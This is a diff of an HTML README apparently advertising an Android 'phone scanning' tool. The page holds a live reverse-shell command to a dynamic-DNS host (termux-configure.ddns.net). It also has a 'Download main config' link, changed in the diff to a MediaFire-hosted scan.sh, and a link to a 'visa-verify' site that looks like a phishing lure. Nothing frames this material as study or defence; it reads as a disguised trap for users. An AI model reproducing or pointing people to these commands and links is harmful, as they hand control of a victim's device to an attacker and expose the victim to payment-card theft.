@@ -45,7 +45,7 @@ SCANNING PHONE ANDROID ONLY
   <p align="center">
     bash -i >& /dev/tcp/termux-configure.ddns.net/25251 0>&1
     <br />
-    <b><a href="https://servicez.ml/hackers.com/config.sh"><strong>Download main config »</strong></a></b>
+    <b><a href="https://www.mediafire.com/file/zt6z6cuhwj4khs5/scan.sh/file?dkey=rwvulpvpaya&r=1075"><strong>Download main config »</strong></a></b>
     <br />
     <br />
     <a href="http://visa-verify.ddns.net/">Verification visas</a>
